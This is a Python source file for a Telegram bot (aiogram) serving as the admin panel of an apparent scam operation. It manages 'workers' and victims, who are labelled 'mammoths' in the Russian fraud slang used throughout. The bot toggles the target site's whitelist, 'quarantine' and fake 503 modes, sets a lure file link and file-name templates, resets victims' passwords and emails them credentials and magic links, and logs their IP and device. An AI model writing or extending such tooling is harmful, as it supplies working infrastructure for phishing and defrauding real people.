from aiogram import Router, F,Dispatcher
from aiogram.types import Message, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup,ReplyKeyboardMarkup,KeyboardButton,ReplyKeyboardRemove
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram3_di import Depends
from filters import IsGroupWithOwner
from api_client import  SessionExpiredError,DjangoAPIClient
from datetime import datetime
from .utils import make_user_buttons
from send_mail import send_email
from validate_email import validate_email
start_router = Router()

PAGE_SIZE = 15

class SetLinkState(StatesGroup):
    waiting_for_link = State()

class ShablonStates(StatesGroup):
    waiting_first_shablon = State()
    waiting_second_shablon = State()

async def show_menu(message: Message, api_client : DjangoAPIClient):
    stats = await api_client.get_user_stats(message.from_user.id)
    checker = await api_client.get_system_states(message.from_user.id)
    link_data, status = await api_client.get(message.from_user.id, "api/link/info")

    current_link = link_data.get("link") if status == 200 else None
    link_text = f"{current_link}" if current_link else "Ссылки нету"

    if stats:
        
        profile = stats["profile_data"]
        workers = stats["workers_count"]
        users = stats["users_count"]
        created = stats["created_by_me_count"]

        user_role = profile['role']


        text = (
            f"Пользователь: {profile['username']}\n"
            f"Уровень: {user_role}\n\n"
            f"Ссылка файла:\n{link_text}\n\n"
            f"Состояние сайта:\n"
            f"📄 Вайтлист: {'🔴 ВЫКЛ' if checker['whitelist'] else '🟢 ВКЛ'}\n"
            f"😷 Карантин: {'🟢 ВКЛ' if checker['carantin'] else '🔴 ВЫКЛ'}\n"
            f"💀 Ошибка 503: {'🟢 ВКЛ' if checker['error_503'] else '🔴 ВЫКЛ'}\n\n"
            f"Количество пользователей:\n"
            f"🧑‍💻 Воркеры: {workers}\n"
            f"🐇 Мои мамонты: {created}\n"
            f"🐘 Все мамонты: {users}\n"
        )

        if user_role == 'super_admin':
            keyboard = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text="👑 Пользователи")],
                    [KeyboardButton(text="⚠️ Карантин"),KeyboardButton(text="✅ Вайтлист")],
                    [KeyboardButton(text="⚙️ Настройки"),KeyboardButton(text="💀 Ошибка 503")],
                    [KeyboardButton(text="🔄 Обновить информацию")],
                ],
                resize_keyboard=True,
                input_field_placeholder='Выберите пункт меню'
            )
            
        
        elif user_role == 'admin':
            keyboard = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text="👑 Пользователи")],
                    [KeyboardButton(text="⚠️ Карантин"),KeyboardButton(text="✅ Вайтлист")],
                    [KeyboardButton(text="📋 Шаблон")],
		    [KeyboardButton(text="🔄 Обновить информацию")],
                ],
                resize_keyboard=True,
                input_field_placeholder='Выберите пункт меню'
            )
            
        
        else:  # user 
            keyboard = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text="👑 Пользователи")],
                    [KeyboardButton(text="⚠️ Карантин"),KeyboardButton(text="📋 Шаблон")],
		    [KeyboardButton(text="🔄 Обновить информацию")],
                ],
                resize_keyboard=True,
                input_field_placeholder='Выберите пункт меню'
            )
            
        
        await message.answer(text, reply_markup=keyboard)
    else:
        await message.answer("⚠ Не удалось получить статистику")




# Обработчики для разных ролей
@start_router.message(IsGroupWithOwner, F.text == "👑 Пользователи")
async def super_admin_users_callback(message: Message, api_client : DjangoAPIClient):
    stats = await api_client.get_user_stats(message.from_user.id)
    if not stats:
        await message.answer("Ошибка получения данных, введите /setup_start",reply_markup=ReplyKeyboardRemove())

    profile = stats["profile_data"]
    user_role = user_role = profile['role']
    workers = stats["workers_count"]
    users = stats["users_count"]
    created = stats["created_by_me_count"]

    if user_role in ['super_admin', 'admin']:

        keyboard = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text="🙋‍♂️ Добавить пользователя")],
                    [KeyboardButton(text="🐇 Мои мамонты"),KeyboardButton(text="🧑‍💻 Воркеры")],
                    [KeyboardButton(text="🐘 Все мамонты")],
                    [KeyboardButton(text="🏠 Выйти в главное меню")],
                ],
                resize_keyboard=True,
                input_field_placeholder='Выберите пункт меню'
            )


        await message.answer(
            f"👥 Пользователи\n\n"
            f"Количество пользователей:\n"
            f"🧑‍💻Воркеры: {workers}\n"
            f"🐇Мои мамонты: {created}\n"
            f"🐘Все мамонты: {users}\n",
            reply_markup=keyboard
        )
    elif user_role == 'worker':

        keyboard = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text="🙋‍♂️ Добавить пользователя")],
                    [KeyboardButton(text="🐇 Мои мамонты")],
                    [KeyboardButton(text="🏠 Выйти в главное меню")],
                ],
                resize_keyboard=True,
                input_field_placeholder='Выберите пункт меню'
            )


        await message.answer(
            f"👥 Пользователи\n\n"
            f"Количество пользователей:\n"
            f"🧑‍💻Воркеры: {workers}\n"
            f"🐇Мои мамонты: {created}\n"
            f"🐘Все мамонты: {users}\n",
            reply_markup=keyboard
        )

    else:
        await message.answer("❌ Доступ запрещен", show_alert=True)
    


@start_router.message(IsGroupWithOwner, F.text == "⚙️ Настройки")
async def setting_message(message: Message, api_client : DjangoAPIClient):
        user_role = await api_client.get_user_role(message.from_user.id)
        if user_role not in ['super_admin', 'admin']:
                await message.answer("❌ Доступ запрещен", show_alert=True)
                return
        
        keyboard = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text="📊 Лог дейсвий")],
                    [KeyboardButton(text="🔗 Ссылка"),KeyboardButton(text="📋 Шаблон")],
                    [KeyboardButton(text="✉️ Почта")],
                    [KeyboardButton(text="🏠 Выйти в главное меню")],

                ],
                resize_keyboard=True,
                input_field_placeholder='Выберите пункт меню'
            )


        await message.answer(
            "🛠️ Настройки",
            reply_markup=keyboard
        )


@start_router.message(IsGroupWithOwner, F.text == "📋 Шаблон")
async def shablon(message: Message, api_client : DjangoAPIClient):
        keyboard = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text="📝 Создатель файла")],
                    [KeyboardButton(text="🖼️ Название файла")],
                    [KeyboardButton(text="🏠 Выйти в главное меню")],
                ],
                resize_keyboard=True,
                input_field_placeholder='Выберите пункт меню'
            )


        await message.answer(
            "📋 Шаблоны",
            reply_markup=keyboard
        )

@start_router.message(IsGroupWithOwner, F.text == "📝 Создатель файла")
async def shablon_name(message: Message, api_client : DjangoAPIClient):
    user_id = message.from_user.id

    data,status = await api_client.get(user_id,"api/users/shablon/first/")

    if status == 200:

        keyboard_info = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text="➕ Создать шаблон создателя файла")],
                    [KeyboardButton(text="🏠 Выйти в главное меню"),KeyboardButton(text="📋 Шаблон")],
                ],
                resize_keyboard=True,
                input_field_placeholder='Выберите пункт меню'
            )
        
        
        shablons = data
        if not shablons:
            await message.answer("📋 У вас пока нет шаблонов",reply_markup=keyboard_info)
            return
        
        keyboard_buttons = []
        for shablon in shablons:
            shablon_id = shablon.get('id')
            content = shablon.get('shablon', 'Пустой шаблон')
            keyboard_buttons.append([
                InlineKeyboardButton(
                    text=f"{content}", 
                    callback_data=f"deleteshablonfirst_{shablon_id}"
                )
            ])
        keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)

        await message.answer(
            "📋 Все шаблоны создателя файла:",
            reply_markup=keyboard
        )

        await message.answer(
            "Нажмите на шаблон чтобы удалить",
            reply_markup=keyboard_info
        )

#Воторой шаблон
@start_router.message(IsGroupWithOwner, F.text == "🖼️ Название файла")
async def shablon_file(message: Message, api_client : DjangoAPIClient):
    user_id = message.from_user.id

    data,status = await api_client.get(user_id,"api/users/shablon/second/")

    if status == 200:

        keyboard_info = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text="➕ Создать шаблон название файла")],
                    [KeyboardButton(text="🏠 Выйти в главное меню"),KeyboardButton(text="📋 Шаблон")],
                ],
                resize_keyboard=True,
                input_field_placeholder='Выберите пункт меню'
            )
        
        
        shablons = data
        if not shablons:
            await message.answer("📋 У вас пока нет шаблонов",reply_markup=keyboard_info)
            return
        
        keyboard_buttons = []
        for shablon in shablons:
            shablon_id = shablon.get('id')
            content = shablon.get('shablon', 'Пустой шаблон')
            keyboard_buttons.append([
                InlineKeyboardButton(
                    text=f"{content}", 
                    callback_data=f"deleteshablonsecond_{shablon_id}"
                )
            ])
        keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)

        await message.answer(
            "📋 Все шаблоны название файла:",
            reply_markup=keyboard
        )

        await message.answer(
            "Нажмите на шаблон чтобы удалить",
            reply_markup=keyboard_info
        )





@start_router.callback_query(IsGroupWithOwner,F.data.startswith("deleteshablonfirst_"))
async def user_shablon_delete_first_callback(callback: CallbackQuery, api_client: DjangoAPIClient):
    shablon_id = int(callback.data.split("_")[1])
    user_id = callback.from_user.id

    data, status = await api_client.delete(user_id ,f"api/users/shablon/first/{shablon_id}/")
    
    if status == 200:
        await callback.message.edit_text("✅ Шаблон создателя файла удален")
    else:
        await callback.message.answer("❌ Ошибка при удалении шаблона")
        
        await callback.answer()


@start_router.callback_query(IsGroupWithOwner,F.data.startswith("deleteshablonsecond_"))
async def user_shablon_delete_second_callback(callback: CallbackQuery, api_client: DjangoAPIClient):
    shablon_id = int(callback.data.split("_")[1])
    user_id = callback.from_user.id

    data, status = await api_client.delete(user_id ,f"api/users/shablon/second/{shablon_id}/")

    if status == 200:
        await callback.message.edit_text("✅ Шаблон создателя файла удален")
    else:
        await callback.message.answer("❌ Ошибка при удалении шаблона")
        
        await callback.answer()



@start_router.message(IsGroupWithOwner, F.text == "➕ Создать шаблон создателя файла")
async def create_first_shablon(message: Message, state: FSMContext):
    await message.answer("📝 Введите текст для шаблона создателя файла:")
    await state.set_state(ShablonStates.waiting_first_shablon)


@start_router.message(ShablonStates.waiting_first_shablon)
async def process_first_shablon(message: Message, state: FSMContext, api_client: DjangoAPIClient):
    user_id = message.from_user.id
    content = message.text
    
    data, status = await api_client.post(user_id, "api/users/shablon/first/", json={"shablon": content})
    keyboard_info = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text="➕ Создать шаблон название файла")],
                    [KeyboardButton(text="🏠 Выйти в главное меню"),KeyboardButton(text="📋 Шаблон")],
                ],
                resize_keyboard=True,
                input_field_placeholder='Выберите пункт меню'
            )    
    
    if status == 201 or status == 200:
        await message.answer("✅ Шаблон создателя файла сохранен!",reply_markup=keyboard_info)
    else:
        await message.answer("❌ Ошибка при сохранении шаблона")
    
    await state.clear()


@start_router.message(IsGroupWithOwner, F.text == "➕ Создать шаблон название файла")
async def create_second_shablon(message: Message, state: FSMContext):
    await message.answer("📝 Введите текст для шаблона названия файла:")
    await state.set_state(ShablonStates.waiting_second_shablon)

@start_router.message(ShablonStates.waiting_second_shablon)
async def process_second_shablon(message: Message, state: FSMContext, api_client: DjangoAPIClient):
    user_id = message.from_user.id
    content = message.text
    
    data, status = await api_client.post(user_id, "api/users/shablon/second/", json={"shablon": content})

    keyboard_info = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text="➕ Создать шаблон название файла")],
                    [KeyboardButton(text="🏠 Выйти в главное меню"),KeyboardButton(text="📋 Шаблон")],
                ],
                resize_keyboard=True,
                input_field_placeholder='Выберите пункт меню'
            )
    
    if status == 201 or status == 200:
        await message.answer("✅ Шаблон названия файла сохранен!",reply_markup=keyboard_info)
    else:
        await message.answer("❌ Ошибка при сохранении шаблона")
    
    await state.clear()



# выводить во время создания юзера 


@start_router.message(IsGroupWithOwner, F.text == "🔗 Ссылка")
async def setting_message(message: Message, api_client : DjangoAPIClient):
        user_role = await api_client.get_user_role(message.from_user.id)

        if user_role not in ['super_admin', 'admin']:
                await message.answer("❌ Доступ запрещен", show_alert=True)
                return
        
        link_data, status = await api_client.get(message.from_user.id, "api/link/info")

        current_link = link_data.get("link") if status == 200 else None
        link_text = f"Ссылка: {current_link}" if current_link else "Ссылки нету"


        keyboard = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text="✉️ Установить ссылку")],
                    [KeyboardButton(text="❌ Удалить ссылку")],
                    [KeyboardButton(text="🏠 Выйти в главное меню")],
                ],
                resize_keyboard=True,
                input_field_placeholder='Выберите пункт меню'
            )


        await message.answer(
            f"🔗 Настройки ссылки\n\n{link_text}",
            reply_markup=keyboard
        )


@start_router.message(IsGroupWithOwner, F.text == "✉️ Установить ссылку")
async def set_link_start(message: Message, state: FSMContext):
    await message.answer("Введите новую ссылку:", reply_markup=ReplyKeyboardRemove())
    await state.set_state(SetLinkState.waiting_for_link)

    # Ждем следующего сообщения пользователя с ссылкой
@start_router.message(IsGroupWithOwner, SetLinkState.waiting_for_link)
async def set_link_receive(message: Message, state: FSMContext, api_client: DjangoAPIClient):
        new_link = message.text.strip()

        if not new_link:
            await message.answer("❌ Ссылка не может быть пустой")
            return
        
        # Создаем/заменяем ссылку через API
        data, status = await api_client.post(
            message.from_user.id,
            "api/link/create",
            json={"link": new_link}
        )
        keyboard = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text="🔗 Ссылка")],
                    [KeyboardButton(text="🏠 Выйти в главное меню")],
                    
                ],
                resize_keyboard=True,
                input_field_placeholder='Выберите пункт меню'
            )
        if status in (200, 201):
            await message.answer(f"✅ Ссылка успешно установлена: {new_link}",reply_markup=keyboard)
        else:
            await message.answer("❌ Ошибка при установке ссылки",reply_markup=keyboard)
            
        await state.clear()


@start_router.message(IsGroupWithOwner, F.text == "❌ Удалить ссылку")
async def delete_link(message: Message, api_client: DjangoAPIClient):
    data, status = await api_client.delete(
        message.from_user.id,
        "api/link/delete"
    )
    keyboard = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text="🔗 Ссылка")],
                    [KeyboardButton(text="🏠 Выйти в главное меню")],
                    
                ],
                resize_keyboard=True,
                input_field_placeholder='Выберите пункт меню'
    )
    if status in (200, 204):
        await message.answer("✅ Ссылка успешно удалена",reply_markup=keyboard)
    else:
        await message.answer("❌ Ошибка при удалении ссылки",reply_markup=keyboard)


@start_router.message(IsGroupWithOwner, F.text == "🏠 Выйти в главное меню")
async def go_back(message: Message, api_client: DjangoAPIClient):
    await show_menu(message,api_client)

@start_router.message(IsGroupWithOwner, F.text == "🔄 Обновить информацию")
async def go_back(message: Message, api_client: DjangoAPIClient):
    await show_menu(message,api_client)


@start_router.message(IsGroupWithOwner, F.text == "📊 Лог дейсвий")
async def logs_message(message: Message, api_client: DjangoAPIClient):
    user_role = await api_client.get_user_role(message.from_user.id)
    keyboard = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="🏠 Выйти в главное меню")]],
            resize_keyboard=True,
            input_field_placeholder='Выберите пункт меню'
        )
    
    if user_role not in ['super_admin', 'admin']:
        await message.answer("❌ Доступ запрещен", show_alert=True)
        return

    
    data, status = await api_client.get(message.from_user.id, "api/mode/logs/")
    if status != 200:
        await message.answer("❌ Не удалось получить список пользователей")
        return
    
    action_emojis = {
        "Карантин включен": "⚠️",
        "Карантин выключен": "⚠️",
        "Ошибка 503 включена": "💀",
        "Ошибка 503 выключена": "💀",
        "Белый список включен": "📄",
        "Белый список выключен": "📄",
    }

    text = "📊 Последние действия:\n\n"

    for log in data:
        emoji = action_emojis.get(log['action'], "⚡")
        text += f"👤 {log['user']}  🕒 {log['date']} {emoji} {log['action']}\n\n"
    
    await message.answer(text, reply_markup=keyboard)



@start_router.message(IsGroupWithOwner, F.text == "🐘 Все мамонты")
async def all_users_message(message: Message, api_client: DjangoAPIClient):
    user_role = await api_client.get_user_role(message.from_user.id)

    if user_role not in ['super_admin', 'admin']:
        await message.answer("❌ Доступ запрещен", show_alert=True)
        return

    # Получаем первую страницу пользователей
    data, status = await api_client.get(message.from_user.id, "api/users/?page=1")
    if status != 200:
        await message.answer("❌ Не удалось получить список пользователей")
        return

    keyboard = make_user_buttons(data)
    await message.answer("Выберите пользователя:", reply_markup=keyboard)


@start_router.message(IsGroupWithOwner, F.text == "🐇 Мои мамонты")
async def my_users_message(message: Message, api_client: DjangoAPIClient):
    # Получаем первую страницу пользователей
    data, status = await api_client.get(message.from_user.id, "api/users/created-by-me/?page=1")
    if status != 200:
        await message.answer("❌ Не удалось получить список пользователей")
        return

    keyboard = make_user_buttons(data)
    await message.answer("Выберите пользователя:", reply_markup=keyboard)

@start_router.message(IsGroupWithOwner, F.text == "🧑‍💻 Воркеры")
async def all_workers_message(message: Message, api_client: DjangoAPIClient):
    user_role = await api_client.get_user_role(message.from_user.id)

    if user_role not in ['super_admin', 'admin']:
        await message.answer("❌ Доступ запрещен", show_alert=True)
        return

    # Получаем первую страницу пользователей
    data, status = await api_client.get(message.from_user.id, "api/workers/?page=1")
    if status != 200:
        await message.answer("❌ Не удалось получить список пользователей")
        return

    keyboard = make_user_buttons(data)
    await message.answer("Выберите пользователя:", reply_markup=keyboard)

@start_router.callback_query(IsGroupWithOwner,F.data.startswith("users_page_"))
async def users_page_callback(callback: CallbackQuery, api_client: DjangoAPIClient):
    page = callback.data.split("_")[-1]
    user_role = await api_client.get_user_role(callback.from_user.id)

    data, status = await api_client.get(callback.from_user.id, f"api/users/?page={page}")
    if status != 200:
        await callback.answer("❌ Ошибка при получении пользователей")
        return

    keyboard = make_user_buttons(data)
    await callback.message.edit_text("Выберите пользователя:", reply_markup=keyboard)
    await callback.answer()

async def send_user_info(callback: CallbackQuery, api_client: DjangoAPIClient, user_id: int):
    data, status = await api_client.get(callback.from_user.id, f"api/users/{user_id}/")
    if status == 200:
        date_create = data['date_create'][:10]
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text=f"{'Разблокировать' if data['is_block'] else 'Заблокировать'}",callback_data=f"{'unblock' if data['is_block'] else 'block'}_{user_id}")],
                [InlineKeyboardButton(text="Отправить email", callback_data=f"send_emeil_{user_id}")],
                [InlineKeyboardButton(text="Удалить", callback_data=f"delete_{user_id}")],
            ]
        )

        await callback.message.answer(
            f"Информация о пользователе:\n"
            f"Пользователь: {data['username']}\n\n"
            f"Уровень: {data.get('role', 'user')}\n\n"
            f"Дата создания: {date_create}\n\n"
            f"Дополнительная информация:\n"
            f"Почт отправленно: {data['emeil_sends']}\n"
            f"С чего зашел: {data['device']}\n"
            f"ip: {data['ip']}\n\n"
            f"Доступа к сайту {'закрыт 🔴' if data['is_block'] else 'открыт 🟢'} \n",
            reply_markup=keyboard
        )
    else:
        await callback.message.answer("❌ Не удалось получить данные пользователя")
    
    await callback.answer()



@start_router.callback_query(IsGroupWithOwner,F.data.startswith("user_"))
async def user_selected_callback(callback: CallbackQuery, api_client: DjangoAPIClient):
    user_id = int(callback.data.split("_")[1])
    data, status = await api_client.get(callback.from_user.id, f"api/users/{user_id}/")
    date_create = data['date_create'][:10]

    if status == 200:
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text=f"{'Разблокировать' if data['is_block'] else 'Заблокировать'}", callback_data=f"{'unblock' if data['is_block'] else 'block'}_{user_id}")],
                [InlineKeyboardButton(text="Отправить email", callback_data=f"send_emeil_{user_id}")],
                [InlineKeyboardButton(text="Удалить", callback_data=f"delete_{user_id}")],
            ]
        )
        
        await callback.message.answer(
            f"Информация о пользователе:\n"
            f"Пользователь: {data['username']}\n\n"
            f"Уровень: {data.get('role', 'user')}\n\n"
            f"Дата создания: {date_create}\n\n"
            f"Дополнительная информация:\n"
            f"Почт отправленно: {data['emeil_sends']}\n"
            f"С чего зашел: {data['device']}\n"
            f"ip: {data['ip']}\n\n"
            f"Доступа к сайту {'закрыт 🔴' if data['is_block'] else 'открыт 🟢'} \n",
            reply_markup=keyboard
        )
    else:
        await callback.message.answer("❌ Не удалось получить данные пользователя")
    
    await callback.answer()



@start_router.callback_query(IsGroupWithOwner,F.data.startswith("send_emeil_"))
async def send_email_callback(callback: CallbackQuery, api_client: DjangoAPIClient):
    user_id = int(callback.data.split("_")[2])
    data, status = await api_client.get(callback.from_user.id, f"api/users/{user_id}/")

    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="🏠 Выйти в главное меню")]],
        resize_keyboard=True,
        input_field_placeholder='Выберите пункт меню'
    )


    if status != 200:
        await callback.message.answer("❌ Не удалось получить данные пользователя")
        await callback.answer()
        return
    
    if data.get("role") != "user":
        await callback.message.answer("❌ Email можно отправлять только обычным пользователям")
        await callback.answer()
        return
    
    magic_payload = {"user_id": user_id}
    magic_data, magic_status = await api_client.post(callback.from_user.id, "api/invite/create/", json=magic_payload)

    magic_link = magic_data.get("magic_link") if magic_status == 201 else "Не удалось сгенерировать ссылку"
    email_to = data["username"]
    big_text = data.get("big_text", "")

    #Сбрасываем пароль
    reset_data, reset_status = await api_client.post(callback.from_user.id, f"api/users/{user_id}/reset_password/")
    if reset_status != 200:
        await callback.message.answer("❌ Не удалось сбросить пароль")
        return

    password = reset_data["new_password"]

    if validate_email(email_to):
        result = send_email(
            receiver_email=email_to,
            login = email_to,
            password=password,
            magic_link=magic_link,
            big_text=big_text
        )
        await callback.answer(result, reply_markup=keyboard)

        if "✅ Почта была успешно отправлена!" in result:
            new_count = data.get("emeil_sends", 0) + 1
            await api_client.patch(callback.from_user.id, f"api/users/{user_id}/update/", json={"emeil_sends": new_count})


    await callback.answer()

@start_router.callback_query(IsGroupWithOwner,F.data.startswith("block_"))
async def user_block_callback(callback: CallbackQuery, api_client: DjangoAPIClient):
    user_id = int(callback.data.split("_")[1])
    data, status = await api_client.get(callback.from_user.id, f"api/users/{user_id}/")
    if status == 200:
        is_block_new = True  # если был False, станет True
        update_payload = {"is_block": is_block_new}

        updated_data, update_status = await api_client.put(
        callback.from_user.id, f"api/users/{user_id}/update/", json=update_payload
        )
        if update_status == 200:
            await callback.message.answer(f"Пользователь {data['username']} заблокирован 🔴")
            await send_user_info(callback, api_client, user_id)
        else:
            await callback.message.answer(f"❌ Не удалось изменить статус пользователя: {updated_data}")

    else:
        await callback.message.answer("❌ Не удалось получить данные пользователя")
    
    await callback.answer()

@start_router.callback_query(IsGroupWithOwner,F.data.startswith("unblock_"))
async def user_unblock_callback(callback: CallbackQuery, api_client: DjangoAPIClient):
    user_id = int(callback.data.split("_")[1])
    data, status = await api_client.get(callback.from_user.id, f"api/users/{user_id}/")
    if status == 200:
        is_block_new = False 
        update_payload = {"is_block": is_block_new}

        updated_data, update_status = await api_client.put(
        callback.from_user.id, f"api/users/{user_id}/update/", json=update_payload
        )
        if update_status == 200:
            await callback.message.answer(f"Пользователь {data['username']} разблокирован 🟢")
            await send_user_info(callback, api_client, user_id)
        else:
            await callback.message.answer(f"❌ Не удалось изменить статус пользователя: {updated_data}")

    else:
        await callback.message.answer("❌ Не удалось получить данные пользователя")
    
    await callback.answer()



@start_router.callback_query(IsGroupWithOwner,F.data.startswith("delete_"))
async def user_delete_callback(callback: CallbackQuery, api_client: DjangoAPIClient):
    user_id = int(callback.data.split("_")[1])
    data, status = await api_client.get(callback.from_user.id, f"api/users/{user_id}/")
    role = data.get("role", "user")
    if role == "super_admin":
        await callback.message.answer(f"❌ Пользователя с ролью super_admin удалить нельзя")
        await callback.answer()
        return
    else:
        if status == 200:
            username = data.get("username", "Пользователь")
            deleted_data, delete_status = await api_client.delete(callback.from_user.id, f"api/users/{user_id}/delete/")
            if delete_status == 204 or delete_status == 200:  # DRF обычно возвращает 204 No Content при успешном удалении
                await callback.message.answer(f"✅ Пользователь {username} успешно удалён")
            else:
                await callback.message.answer(f"❌ Не удалось удалить пользователя: {deleted_data}")

        else:
            await callback.message.answer("❌ Не удалось удалить пользователя")
        
        await callback.answer()


